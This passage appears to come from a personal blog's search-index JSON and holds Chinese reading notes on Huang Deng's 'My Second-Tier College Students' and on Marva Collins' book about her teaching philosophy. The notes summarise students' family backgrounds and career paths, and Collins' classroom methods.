班上的女生很多在毕业后经过折腾，通过考公务员，进入机关事业单位，获得安稳工作，其二是银行、保险等金融机构，其三，国营、民营及各类私营企业，最后是：创业\n梅怡的就业观中，没有动过寻找稳定工作的心思，和父母的鼓励、大城市出身、长大后的见识、较好的家庭经济条件分不开\n062111学生之所以能在教育彻底市场化的境况下，获得良好的发展机会，显示了这一代普通青年，曾经拥有的丰富资源和时代机遇\n分化已经开始： 一部分实现了财务自由，另一部分居无定所、收入有限，两者分野的关键要素是是否买房\n曾迎欢 毕业就去北京，开拓了眼界，提升了能力，打下了基础，回到广州。婚后选择买房，靠着借款和存款一次性付清，有了第一个孩子后，选择全职妈妈，期间还留意政策风向、金融市场动态，适当理财，第二年又购置第二套房。基本上每年一套房，实现财富增值。得益于努力和忧患意识\n陈柳鸿 家里经商，耳濡目染，她的小姨注重培养她社交能力，毕业后通过家里人脉，进入广州某行业协会，由于复杂的人际关系，离开，进入了某电视台，认识了杨总，走上了艺术品拍卖，开始累积了人脉，与知名作家妻子合作做翡翠生意，后面合作崩盘，自己单干抓住微商红利。庆幸关键时刻总有贵人相助\n杨胜轩 父母下岗，房屋拆迁，在拆迁补偿的基础上借钱买饭，抓住了稍纵即逝的红利。父母下岗后生存所遭遇的艰辛，在他性格中打下了很深的烙印\n对照记 两种完全不同的教育图景：计划经济条件下国家主导的高等教育 与 市场经济条件下资本与资源主导的高等教育\n教育目标指向的是为集体（祖国或社会）培养“人才”，到 培养成为能找到工作的就业主体；从 立足将大学生还原到一个完整的人，注重学生的整体素养和长远发展，学生既不会被就业绑架，也不会盲目地受制于一些所谓的就业技能而忽略掉更为重要的专业学习 到 就业不确定性增加，学校为了增加就业的筹码，往往没有经过严密的认证就增设过多工具性的课程，专业所涉及的学科门类太多，大部分课程蜻蜓点水，没有专业含量，学生无所适从，焦虑弥漫，盲目跟风，无暇提升专业能力\n随着失去“国家分配”的兜底和庇护，学生的毕业去向越来越受制于个体背后掌握的资源，学生的命运某种程度上是由原生家庭决定的\n能够在洪流中搏击的，顺应了资本隐秘规则的，往往能获得快速的财富积累，实现所谓的人生逆袭；而那些仅仅错过了一步，没有跟上转折结点，依然坚守劳动创造价值的，固守本分稳妥的孩子，在随后无法理喻的市场变幻中，则就会陷入万劫不复的深渊\n四 导师制 在肇庆校区的这个学期，让作者更接近学生，通过导师制这种新的方式与学生进行交流\n班主任的工作，给我了一个广角镜头，让我从整体层面，对学生群体有更多直观的认识，得以在命运的变迁中，感受到不同群体面临的选择、命运；“导师制”则给我了一个特写镜头，在和学生的交流中，他们的坦诚、信任，让我得以拥有机会，对眼前的青年群体有了更多真实、丰富的感知\n刘婉丽 目睹家境破败、亲人态度的变化，家庭变化让她鉴定读书改变命运的念头。身处北方乡村的人际网络，从小就感知到了密不透风的人情世故，这也是她坚定离开北方去南方寻梦的动机。家庭的一系列不幸，导致了她神经极度衰弱，凡事小心翼翼。两次差点失学，因为自己的坚持，最后才得以继续读书\n高考压力大，没有发挥好，尽管成绩够上兰州大学，但志愿没人帮助，加之一心想离开，最后来到了广州二本院校。通过大学时间来调整自己的身体状态，在姐姐家当被偷来找她和目睹李敏师姐考研之后，认清了现实，如果想留在南方，最切实可行的出路就是考研。考研失败后，在报社工作，没有提升，让她决定边到图书馆工作边考研，毕业两年后参加研究生考试，因为第一学历没有面试心仪大学，而是调剂到了一所普通大学\n她现在意识到了：之所以如此辛苦，最根本的原因，既不是大学时代缺乏老师的指引，也不来自没有较早地做职业规划，更不来自“情商低、不狡猾”，而是和西北农家出身、和高考失利所带来的限制有更深的关联，没有人告诉你怎么躲开，迟早会撞上\n徐则良 父母躲计划生育，他小时候和爷爷奶奶生活在一起，后来父母回家了，父母关系不好，经常吵架，也因为孩子多，家务忙，经济压力大，没有心思打点孩子们的生活细节。没有考上高中，在纺织厂上班，奶奶叫他回去复读，复读班他遇到了一些好老师，老师给予他的温情，让他感受到了极大的慰籍，一点点唤醒了他内心柔软的一面，他对同学特别好，老师和同学的认可重塑了他的自我认知，增强了他的自信，考上了重点高中\n进入大学后，突然顿悟一件事，原谅了童年阶段妈妈对自己的漠视、粗疏，他突然明白妈妈的局限，更多来源她的成长环境，来源她教育的匮乏和爱的贫瘠，而不能归结到后妈一样的坏心眼\n在大学期间随波逐流，毕业后并没有找到好的工作，认为大学最大的失误，在于没有好的时间管理和职业规划，缺乏明确的目标指引，第一份工作很重要，会限制人的求职方向。通过第三份工作，掌握公众号运营的基本知识，后进入一家化妆品公司，然后是谭村淘宝旗下公司，都做新媒体相关工作，每次薪水都能提高 家乡同班同学李鸿姚选择回乡考公务员，两种不同选择背后的人生：貌似镶嵌在繁华的都市，背后却是无尽的苍凉；貌似落入贫瘠的村庄，背后确实稳定受人尊重的职业\n李沐光 母亲是偷渡来中国的越南人，因为母亲身份，不能外出打工，所以他儿童时期，拥有了父母完整的呵护和关心；两个弟弟辍学后步入社会，二弟沾染恶习，三弟年幼，相对听话些 中学时代，家境贫困，主要经济来源就是父母做的小工，家里房子也破旧，在村委号召下大家捐款，加上自己借钱，才得以建一层楼\n沐光的家庭情况，算得上艰难之列，但和很多孩子不同，他没有太多因为出身贫寒所致的局促、不安，也没有一定要出人头地地狠劲\n他发现，城里的同学，尽管很有礼貌，但始终难以走近，与人总保持一种距离，这也许和独生子女的成长环境有关 转折点：因为被电信诈骗 1w 块钱，他开始在系部勤工俭学，开始接触学生管理工作，逐渐学会和别人沟通，开始变得自信\n杜子然 来自典型的中产家庭，与父母相处融洽，家庭民主，像任何衣食无忧的中产知识分子家庭一样，子然对于生活的苦难，并没有直接的感知，她意识到自己对于生活的复杂和多重向度，缺乏直接的认识和感知，所以开始热衷于一些公益组织，帮助一些自闭症孩子，一直持续到了大学毕业，这段经历让她迅速地逼近生活真相，对人性的丰富性有了更多的体察，懂得了理解是面对生活的一种方式，通过见识到了生活中的更多的无奈后，内心获得了一份更持久的平静，也破除了很多二元对立的成见\n颜芳坤 母亲在她小的时候就不辞而别了，父亲疼爱她，但一直在东莞打工，一年只见面两次，父亲在东莞组建了新的家庭。她从很小开始就通过暑期打工开始了历练，上高中后，接触到了不一样的人，学会了开朗。在大学也勤工俭学，一直以办事利索著称。因为高中时期的大量阅读，使得她能够很好地排解情绪\n2017年开始着手考研，在激励的竞争中，与暨南大学失之交臂，最终也调剂失败，选择准备二战\n单向度的金钱标准、消费主义的疯狂肆虐、信息时代对生命的占有、奴役、大学教育赤裸的就业导向，正在构成我课堂下的年轻人最真实的生命场景\n越是和学生深入交流，越能感知其背后的家庭，在他们身上烙下的印痕，学生成长的可能性，越来越受制于家庭的溢出效应 如果能获得和他们平等交流的机会，其个体的丰富性，便会于自在的打开中，昭然若揭\n五 班主任（1516045班） 从应式教育的通道穿越，他们来到大学课堂，在高中老师对大学想象的善意谎言崩塌、卸除了高考的集中目标后，他们如一卷失去弹性的弹簧，松弛的状态让他们陷入更深的迷茫\n这个班的学生属于互联网原住民，在他们的世界里有两套话语体系，一套是包含网络词汇的话语体系，一套是与父辈、老师共享的话语体系\n吴秀珊 家庭多子女、重男轻女、父母关系不和、像流氓的哥哥、称学生垃圾的老师、亲切的杨老师等等，勾勒出了她成长的基本底色 亲子关系的欠缺所导致的孤独童年、留守经历，用“我一个人长大”来形容这种状况\n胡小芬 因为超生被罚款致贫，但是父母重视四姊妹的学习，经济情况依旧是捉襟见肘\n计生政策所带来的被留守或随父母居无定所，成为了多子女家庭的学生所必须承当的隐秘痛苦，缺爱导致的典型特征就是自卑，内心无所依傍\n历史的尘埃飘过课堂 2005年入职，感受最多的是多媒体泛滥对于传统课堂的冲击，面对现在 1516045 班，则是随着新媒体的兴盛和智能手机的普及，学生人手一部手机的状况对于课堂的瓦解，在知识极易获得的时代，知识的传达，不再是成为教师理所应当的优势，泛滥信息对学生注意力的争夺，成为教师面临的最大挑战\n采用讲授和讨论相结合的方式，让学生更好地理解文学史的构建过程；如果没有系统性的思维训练，所有的知识就必然无法参与他们的个人成长，也无法在具体的生命实践中，达到活学活用的目的。重点大学和一般大学，学生最大的差别是他们是否拥有更多的机会进行学术思维的训练\n“从未想过留广州” 随着了解的深入，从刚接手时候的隔膜，网络的屏障不再成为担心的理由，真正担心的是：他们用网络以外的语言，对自己生存困境的叙述，作者害怕一个固化、无出路的群体，变成残酷的现实\n飞涨的房价、贬值的文凭、日渐减少的工作机会，会妨碍他们从更多的层面理解自己的成长，妨碍他们从个人成功的价值观突围出去构建自己完整、充实、自我主宰、充满力量的生活\n广东学生 广东学生对于本土有极强的认同心理，不愿外出，一是对外地的陌生，尤其是对于内地的隔膜，另一方面是他们“顽固”的生活习惯。长期受到实用主义商业文明的浸淫和传统文化的熏陶，使得他们拥有温和的性格\n潮汕女孩：对经营一份笃定、安稳的生活，冲忙了祖辈延续下来的耐性\n温文妍 父亲出生于贫困的家庭环境，凭借执着敢闯敢干的性格，将家庭从全村最穷变成最富，虽然在经济上衣食无忧，但是父母的对立，让她缺乏安全感，渴望温馨的家庭关系，她在毕业后考上研究生，研究生毕业后在导师的说服下，打消了继续攻读博士的念头，第二年组建了家庭，14年在父母的支持下，加上丈夫的积蓄，在深圳购置了房子，在深圳房价飘升前获得了安身之所，生孩子后暂时放弃就业，做起了全职家庭主妇，母亲不认同她的选择，这归根结底来源母亲对家庭的付出，得不到父亲的认同\n以前我不允许自己停，现在我允许自己停，以前我总觉得生活无意义，随时可以撒手的那种\n在和自己的童年、过去、家庭彻底和解后，文妍突然感觉生活充满阳光，抵达了属于他们这一带的幸福和安稳\n陈雪 家庭收入只能勉强维持开支，大四兼职时就被妈妈交代必须负担妹妹的学费，母亲从小教育：要学会隐忍，这也是她时刻保持固定微笑的原因\n应式教育让人失去理想，大家根本不知道自己喜欢什么，也没时间去培养自己的兴趣，更不知道自己的兴趣在哪里。在大学期间，知道自己要做什么，真的非常重要\n毕业后进入新东方从事教学工作，她所理解教育机构的逻辑：通过难度极大的知识灌输，在恶性竞争中，摧毁孩子的自信，让孩子认识到自己有多差，然后急切地意识到，“必须报班，这才是唯一的出路”\n黄晚秋 相较于很多人一开始没有清晰的规划，在认清考研、留广州的难度后，才选择回到故乡考取公务员当作最后的心理防线和安慰。她对自己的大学生活以及现实有清晰认知，大三那年就将考公务员作为自己最重要的决定，最终则是参加校招，凭借对于面试套路的研究，考进了家乡的中国人寿\n现实对于年轻人的训诫、淘洗，多年工具化的教育管理、就业至上的信条，是晚秋面临的现实处境；她身处其中，不过及时调整姿态，更快地适应，以另一种更为彻底的工具化的方式，找到对付的途径。对现实的顺受和看透，是她面对时代、命运时不纠结的秘密。从个体的角度而言，这是一个突围者的胜利，但从教育效果而言，却是掏空年轻人身上更为重要的青春特质\n深漂二代 张晓霖 在六岁前在老家，爷爷奶奶疼爱她，六岁时被父母接到深圳，为了让孩子得到更好的教育资源，父亲也从最开始的理发店转为了餐饮店，再到最后的照相馆，因为地处人口密集的龙华区，积累了可观的财富，买下了住房和商铺\n姚冰冰 父母都是大学生，她在成都出生，留在爷爷奶奶身边，父母南下深圳，直到五六岁才回到父母身边，父亲经营自己的制造工厂，母亲负责财务的工作 房价非理性飙升对他财富的吞噬，更是从根本上，彻底瓦解了她坚守多年的事业理想。父母看重深圳的教育前景，经济发展到一定程度，必然会重视教育的趋势。他们希望女儿去香港念硕士，然后读博士，毕业后找一个大学教书\n张亚康 父母带着兄弟俩在深圳奔波，在他六岁那年从贩卖蔬菜转向屠宰行业，06年在龙岗平湖买下一栋楼房，尽管房子升值，出租收入可观，但是父母依旧十几年如一日坚持档口卖猪肉的营生，父母的付出给家人提供了可靠的经济保障\n三个家庭能在深圳立足的根本都是实实在在的劳动付出，三个家庭也都极为重视教育，把孩子的命运寄托在教育上面。三个家庭的命运走向也暗示了社会的诸多隐忧，房地产对于家庭财富的决定作用。飙升的房价彻底瓦解了这些学生在大城市奋斗的念头，相比“深漂一代”的执念、粗粝和勇气，“深漂二代”显然更迷恋一份精致和稳定的职业。相较于一代对于深圳情感上的疏离，二代对这个年轻的城市有着强烈的认同心理\n","permalink":"https://aaronlinv.github.io/posts/%E6%88%91%E7%9A%84%E4%BA%8C%E6%9C%AC%E5%AD%A6%E7%94%9F-%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/","summary":"\u003cp\u003e第一次知道黄灯老师是在随机波动的播客：\u003ca href=\"https://c.y.qq.com/base/fcgi-bin/u?__=9u9ACce64MZb\"\u003e【随机波动025】一本二本的尽头是否都是就业零件？\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e后面又在软工教学群里看到了分享：\u003ca href=\"https://mp.weixin.qq.com/s/6CdkrPXAw8GuaqDf8CjXiQ\"\u003e专访《我的二本学生》作者黄灯：看见中国普通年轻人的命运\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e随后也看到了十三幺：\u003ca href=\"https://v.qq.com/x/cover/mzc002009opyj1s/c3315crtcue.html\"\u003e许知远对话黄灯 我和我的二本学生\u003c/a\u003e\n以及黄灯老师的演讲：\u003ca href=\"https://www.bilibili.com/video/BV1hb4y1J7jz\"\u003e黄灯：二本学生的困境，也是当下所有年轻人的危机\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e近期翻阅了黄灯老师所写的这本札记，对于所提到学生有了更具象的了解，书中一些片段与生活认知有高度的重叠，其中就包括：苦难对于学生不同的影响、原生家庭对于孩子成长的影响、大的时代背景下的个体的选择和命运、多子女家庭和独生子女家庭学生性格的差异\u003c/p\u003e\n\u003cp\u003e看这本书的时候，我总会回想起大学时期担任软件工程助教的那些事情。通过助教这个工作，有幸以另一种角度窥见自己所在的学校、自己熟悉的课堂，见证同学们学习的状态。在结束了一个学期的助教工作后，我越发了解同学们的所面临的境况，同时也更深刻地感受到了教师的无奈，以及他们所面临的困境。对于我来说有时这种绝望是打在身上的，能够触及的改变太少了\u003c/p\u003e\n\u003cp\u003e正如黄灯老师所说的：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e我希望我的学生毕业之后都能在社会上立足，不要过着很艰难的生活\n我也希望他们更有冲劲，能够去追求梦想，有更多的勇气，但我知道其实很多爸爸妈妈，他们希望自己的孩子读完大学之后有一份稳定的工作，让父母放心，在城里面立足\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e我也看到有不少学生，在坚持自己的理想和底线的时候，在现实中会碰的头破血流\n我们作为过来人其实在他准备那样去做的时候就能够预料到他的后果，但是当时可能也不忍心去把他的那种激情破灭，但是事实上你过了好多年，再回过头去看其实孩子还是付出很大的代价\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e这个社会的反，抗不能完全由年轻人冲到前面，我觉得这个社会的改革应该首先从反省自己开始，尤其是那些获得利益的人\n一个农村来的孩子，父母通过打工，在外面卖苦力来供养他读书，说句不好听的，你指望他来改变这个社会，我觉得太残酷了\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e互相看见是特别重要的，互相看见才会达成和解，这社会才会产生一种韧性的力量，而不是动不动就撕裂\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch1 id=\"序言-看见他们\"\u003e序言 看见他们\u003c/h1\u003e\n\u003cp\u003e中国二本院校的学生，从某种程度而言，折射了中国最多数普通年轻人的状况，他们的命运，勾画出了中国年轻群体最为常见的成长路径\u003c/p\u003e\n\u003cp\u003e写作的直接动因：课上的关于风的现场写作所引出的故事，让作者意识到了自己对于广东经济发展刻板印象\u003c/p\u003e\n\u003ch1 id=\"一-在龙洞\"\u003e一 在龙洞\u003c/h1\u003e\n\u003cp\u003e龙洞的变化折射了城市变迁史\n不同的学生毕业后都租住在龙洞，伟福将住所收拾的妥帖，让人舒坦，在结束一天的工作后，能拥有让自己享受的空间\n冉辛追将龙洞作为人生过渡期的暂居之处，受到爷爷的影响，对文学骨子里地热爱，最后却选择了人力资源专业，他的选择让爷爷迷茫和失望，这种遗憾也成为了他人生选择的隐秘动力，父母支持考研，提供生活费，通过三年的努力，最终成为复旦的一员。与之相似的还有姚大顺，他们都没有办法按照生活预设好的轨道前行，所以最终选择了考研，但家庭和成长环境不同，导致了大顺无法接受家人资助，全心考研。经过折腾最后回到了龙洞，他是家中的长子，母亲希望他可以稳定下来\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e除了身份已变，他的生活，和学生时代没有太大的不同，他依旧拥有龙洞，拥有学校的操场，拥有活色生香的饭堂，当然，也拥有大学时代低廉的生活成本，甚至还可以非常方便地联系想见的老师。这种便捷也许会让他忘记现实的残酷，淡化母亲给予他的忧伤，让他偶然沉湎咋学生时代的幻梦中\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch1 id=\"二-公共课\"\u003e二 公共课\u003c/h1\u003e\n\u003cp\u003e公共课所教授的《经济应用文写作》与博士期间所学习的写作之间的鸿沟是面临的挑战\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e对于人文学科而言，多媒体对于课堂的干扰和伤害，先让没有引起足够的重视，信息的泛滥及花里胡哨的内容，让老师无形中倍感压迫，也让学生在深度思考和理解上，缺乏锻炼的机会和耐心\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e邓桦真 《风》 写自己家境的贫寒，为贷款烦透心\n朱洁韵 《父爱》 个性要强，来到大学后，幡然醒悟懂得了父亲的爱\u003c/p\u003e\n\u003cp\u003e面临的一个问题：无法触及一个真实群体的问题，企图借助考试，调动他们与己有关的生活经验，以此了解他们对于社会、自身的认知\u003c/p\u003e\n\u003cp\u003e让学生困惑的事情：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e电子产品对生活的渗透\u003c/li\u003e\n\u003cli\u003e负载在家庭之上的生存挣扎\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e城市孩子：批判应式教育，深恶痛绝，刘奕晓比喻为“一场赌博”，方雪怡：高考作为划分线，中国学生的青春时代被简单粗暴地划分成两部分\n农村孩子：充满闯过高考的庆幸惴惴不安\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e正因为经受了压力过大的考试阶段，课堂上学生中规中矩、老成持重，他们的平和中正与我们大学时代的张扬放肆，鲜明对比。他们收缩了属于青春年代的触角和锋芒，逼到绝境，唯一能够下手的对象只有自己\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e从记事起，无形的、细密的重荷就负载在他们身上，早已将他们裁剪得规规整整，难以在生活中泄露狡黠的契机\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e教育像一场慢性炎症，中小学时代服下的猛药、抗生素、激素，到了大学时代，终于结下了漠然、无所谓、不思考、不主动的恶果\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch1 id=\"三-班主任\"\u003e三 班主任\u003c/h1\u003e\n\u003cp\u003e因为班主任的身份，目睹了一个群体从学生时代，完全步入真实的社会，并和这个社会产生真实的关联\u003c/p\u003e\n\u003cp\u003e这些二本学生有的是在毕业后短暂挣扎，但最后又是为了解决生存\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e梦想，每个人都应该拥有，但不是每个人都能实现\n大学毕业后，我的首要任务是要解决我和家人的生活问题\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e四任班长，其中能几个之所以能在社会立足，并过上让长辈放心、安心的稳定生活，要不就是早早认清现实的规划顺着社会去经营生活，要么就是是经过现实的碰撞，终于认清进入体制内工作的优势，选择毕业后回炉考公务员。志勇综合条件优秀，但是毕业后九年经历证明了，现实已经没有多少空间和可能\u003c/p\u003e\n\u003cp\u003e夹缝中的光芒：\n钟梦兰：得益于中国高速的城市化进程，父亲从事建筑行业，在市里购地建房，在小城市生活\n潘海燕：父母进城打工，保证了三姊妹的教育费用，没有重蹈村里贫困家庭长女的遭遇，早早辍学嫁人\n广东发达经济条件和成熟的市场意识，导致家庭开过工厂或小作坊和内地农村家庭依赖农业的鲜明对比，造成职业观念的不同：倾向于从事商业活动\u003c/p\u003e\n\u003cp\u003e062111毕业生去向：\n班上的女生很多在毕业后经过折腾，通过考公务员，进入机关事业单位，获得安稳工作，其二是银行、保险等金融机构，其三，国营、民营及各类私营企业，最后是：创业\u003c/p\u003e\n\u003cp\u003e梅怡的就业观中，没有动过寻找稳定工作的心思，和父母的鼓励、大城市出身、长大后的见识、较好的家庭经济条件分不开\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e062111学生之所以能在教育彻底市场化的境况下，获得良好的发展机会，显示了这一代普通青年，曾经拥有的丰富资源和时代机遇\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e分化已经开始：\n一部分实现了财务自由，另一部分居无定所、收入有限，两者分野的关键要素是是否买房\u003c/p\u003e","title":"我的二本学生 阅读笔记"},{"content":"《马文·柯林斯的教育之道》 是 哈佛幸福课（积极心理学） 中强列推荐的一本书\n这本书主写的是 马文·柯林斯 的成长经历已经和教育理念，仅看介绍，会误认为这本书只是在说鼓励式的教学理念，看完发现还有写塑造了她性格的人生经历，这部分更具有启发性。提及的很多点引起共鸣，能看到个人成长经历对于她教育方式的影响，最终形成的教育理念又改变了很多人的命运\n马文儿时生活在亚拉巴马州蒙罗韦尔小镇，在这里远离了许多犯罪行为，人文、自然让她度过了无忧无虑的快乐童年。她目睹了因为种族的缘故父亲遭受到的不公待遇，但父亲从不墨守成规、安于旧俗 ，拥有强大的价值观和坚定信仰，这使得马文有强烈的安全感并且坚定自信\n小时候通过模仿祖母诵读，马文学会了通过音节拼读单词，祖母读那些书籍诗歌启蒙了马文\n小学时马文因写错2被老师用尺子打手，这影响了马文的教学理念：应该对孩子采取积极的策略，不应该指责和嘲笑，应该建立信心 ，孩子是敏感，自尊心是脆弱的\n因为黑人身份在上学和就业时处处受到限制，致使她在培门罗县训机构教书，这段经历使马文掌握了教学方法，还让她懂得了优秀的教师更应该懂了解学生\n在去芝加哥拜访祖母表亲安妮时，遇见了她的丈夫柯拉鲁斯，丈夫始终都很支持马文做的事\n“能够对别人的孩子表现出极大耐心的男士一定会事一个好父亲和好丈夫”\n在辞去医疗秘书工作后，马文到南卡尔洪小学二年级教书。传统教学通过图片教授阅读，这降低教材和课程难度，学生的反馈使得马文摒弃了这种教学方式，转而选择一些优秀的故事，教授孩子们正确的价值观和生活经验，这相较于传统课本更能激发阅读兴趣\n办公室政治让马文失去了继续留在公立学校的动力，最终马文开始和一群对公立学校不满的女性邻居一起在 丹尼尔·黑尔·威廉姆斯大学 里建立了私立小学，在这所马文自己的小学里，她充分践行了她的教育理念，后来马搬到了自己家二楼并将学校改名为 西区预备学校，继续教书育人\n马文给《芝加哥太阳时报》的专栏作家 扎伊·史密斯 写信，并接受了采访，之后收到关注和捐助，她到公立学校演讲，获得500美元，她也以此激励孩子努力学习\n之后有了更多像 莉莲·沃恩、艾拉·麦考伊 这样的对待孩子温柔有耐心且乐于接受马文的教学方法的老师加入了马文的学校\n《60分钟》栏目为学校打开资金来源，学校换了新的校址，有了更多的学生\n面对各种正面和负面的报道，各种各样的批评，刚开始马文拒绝回应，朋友建议马文回应，但是这使得马文筋疲力竭\n那些讥笑讽刺和含沙射影的批评永远不可能减少她真正的成就：那些孩子接受教育，受到鼓励，变得自信果敢，最后在这个世界上闯出了属于自己得路。这才是马文的宝贵遗产\n马文教学的载体是基础读本中的每个故事，还引入了补充材料，培养学生发散性思维，用概括的方式来启发他们，让学生看见知识的流动 -\u0026gt; 用故事撑起孩子们广阔的知识面 -\u0026gt; 孩子们可把这些知识用于课堂、生活，从而形成正反馈不断激励孩子们自发学习。不局限于文学，她也会讲述歌剧及其背后的故事，她相信：要想让年轻人受到良好的教育，需要让他们接触所有的文化形式。她还在课堂上提出开放式的问题，激发学生批判性思维，提出省略事实的不完整问题，教会他们评估问题，意识到信息不充分\n马文则坚信：“真正的解决途径就是教育，我们必须教会孩子自尊自立，我们必须教导他们，读书、培养技能和自立是非常重要的”\n“马文作为老师的最高目标就是赋予学生为自己学习的意愿”\n教育的重中之重就是让孩子阅读，需要艰难且乏味的学习，没有任何捷径可走\n危害当代教育一个弊端是由于过度强调“进步注意”的教学方法造成的。学校为了努力遵从 约翰·杜威 以学生为中学而非以课程为中心的教学理念，过多地牺牲了教学内容，过度关注如何教而不是教什么\n在我们的学校里，没有奇迹，更没有魔法，否则教书对我而言就不会那么劳神费力了，学习对于这些孩子而言也不会那么艰辛困难了。正是由于所有的这些付出和艰难，孩子们才会细细品味每一次成功，并甘之如饴。并且一但他们开始成功了，便会想要更多，甚至不愿回头\n马文擅长用鼓励或批评引导学生：\n“你们会学习所有的发音规律，这样的单词将不再是什么难懂的谜，多么富有或者多么漂亮。你可以和任何人对话，无论对方多么聪明，多么富有或者多么漂亮。你们都是聪明伶俐的孩子，没有什么事你们做不到的”\n“总有一天，在无数次的赞扬和拥抱之后，他的抵触情绪会自动消解。孩子们最终想要的是，一个真实的自己可以被接受，感受到自己是有价值的。一但他们感觉到自价值，就会痴迷于学习，而且永远都会求知若渴”\n人和事分开，你的行为愚蠢 不等于 人愚蠢，这样学生才能接受意见和批评，放弃错误行为，而不是去尊严或自我价值\n关注每一个孩子，这可能与她的经历有关，对于被孤立的感觉更能感同身受，她也提倡互助小组，不断督促彼此，为彼此取得的小成绩而感到快乐\n课间看见独自的孩子会重新组织游戏玩伴，让每个孩子都感觉到被集体接受，不被排斥\n每个孩子都需要感觉到被爱和被需要。每个孩子都需要归属感。大多数孩子依旧因为在之前的学校里被羞辱和被排挤而痛苦不堪\n她不是被动地等着学生向她寻求帮助，而是常常就让自己在学生身边，通常困惑的孩子会呆在座位上，忘记了解决问题这件事，直到最后完全跟不上，彻底放弃\n当你们想要伤害另一个人的时候，又怎么能够抱怨这个社会有种族偏见呢，所以你们学会互相帮助和相互爱护之前，不要谈论别人都对你们做了什么\n她认为也应该把 ”不好的事物“ 也展现在孩子面前，这也是我们传统教育中比较缺失的东西，导致一部分人不知道该怎么面对现实生活中的苦难\n让孩子知道自己的坏情绪，这很重要，小孩子容易认为是他们做了什么事才给大人添了许多麻烦\n毫不避讳地和孩子谈论自己的事，教师不应该故作完美：“如果老师不展现人类脆弱的一面，那么孩子也会羞于承认他们自己脆弱的一面”\n我也认为，不应该过度保护孩子，不应该把他们的阅读方位局限于只会以盲目乐观地视角审视这个世界的故事。生活是混乱无序且充满瑕疵的，而且孩子们应该被告知这一点，像死亡、贪婪和暴力这些话题并非不可言说的禁忌\n和孩子们分享自己以前做的“坏事”，告诉孩子们：“如果有老师放我一马，我就会得过且过”，所以她严格要求孩子们的学习\n父母对于孩子的教育也起到了非常大的作用\n“在这个混乱的世界里，唯有拥有意志坚定的父母或强大的老师的孩子才能有所成就，至少具备其中一个条件，或者二者都具备”\n必须强大起来并为孩子定调子的应该是家长，家长不给孩子立规矩，却期待老师在课堂上维持好纪律和秩序，在家从未要求承担责任，或者做家务\n","permalink":"https://aaronlinv.github.io/posts/%E9%A9%AC%E6%96%87%E6%9F%AF%E6%9E%97%E6%96%AF%E7%9A%84%E6%95%99%E8%82%B2%E4%B9%8B%E9%81%93%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/","summary":"\u003cp\u003e\u003ca href=\"https://book.douban.com/subject/33394561/\"\u003e《马文·柯林斯的教育之道》\u003c/a\u003e 是 \u003ca href=\"https://www.bilibili.com/video/BV1kx411S7ZU\"\u003e哈佛幸福课（积极心理学）\u003c/a\u003e 中强列推荐的一本书\u003c/p\u003e\n\u003cp\u003e这本书主写的是 马文·柯林斯 的成长经历已经和教育理念，仅看介绍，会误认为这本书只是在说鼓励式的教学理念，看完发现还有写塑造了她性格的人生经历，这部分更具有启发性。提及的很多点引起共鸣，能看到个人成长经历对于她教育方式的影响，最终形成的教育理念又改变了很多人的命运\u003c/p\u003e\n\u003cp\u003e马文儿时生活在亚拉巴马州蒙罗韦尔小镇，在这里远离了许多犯罪行为，人文、自然让她度过了无忧无虑的快乐童年。她目睹了因为种族的缘故父亲遭受到的不公待遇，但父亲从不墨守成规、安于旧俗 ，拥有强大的价值观和坚定信仰，这使得马文有强烈的安全感并且坚定自信\u003c/p\u003e\n\u003cp\u003e小时候通过模仿祖母诵读，马文学会了通过音节拼读单词，祖母读那些书籍诗歌启蒙了马文\u003c/p\u003e\n\u003cp\u003e小学时马文因写错2被老师用尺子打手，这影响了马文的教学理念：应该对孩子采取积极的策略，不应该指责和嘲笑，应该建立信心 ，孩子是敏感，自尊心是脆弱的\u003c/p\u003e\n\u003cp\u003e因为黑人身份在上学和就业时处处受到限制，致使她在培门罗县训机构教书，这段经历使马文掌握了教学方法，还让她懂得了优秀的教师更应该懂了解学生\u003c/p\u003e\n\u003cp\u003e在去芝加哥拜访祖母表亲安妮时，遇见了她的丈夫柯拉鲁斯，丈夫始终都很支持马文做的事\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e“能够对别人的孩子表现出极大耐心的男士一定会事一个好父亲和好丈夫”\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e在辞去医疗秘书工作后，马文到南卡尔洪小学二年级教书。传统教学通过图片教授阅读，这降低教材和课程难度，学生的反馈使得马文摒弃了这种教学方式，转而选择一些优秀的故事，教授孩子们正确的价值观和生活经验，这相较于传统课本更能激发阅读兴趣\u003c/p\u003e\n\u003cp\u003e办公室政治让马文失去了继续留在公立学校的动力，最终马文开始和一群对公立学校不满的女性邻居一起在 丹尼尔·黑尔·威廉姆斯大学 里建立了私立小学，在这所马文自己的小学里，她充分践行了她的教育理念，后来马搬到了自己家二楼并将学校改名为 西区预备学校，继续教书育人\u003c/p\u003e\n\u003cp\u003e马文给《芝加哥太阳时报》的专栏作家 扎伊·史密斯 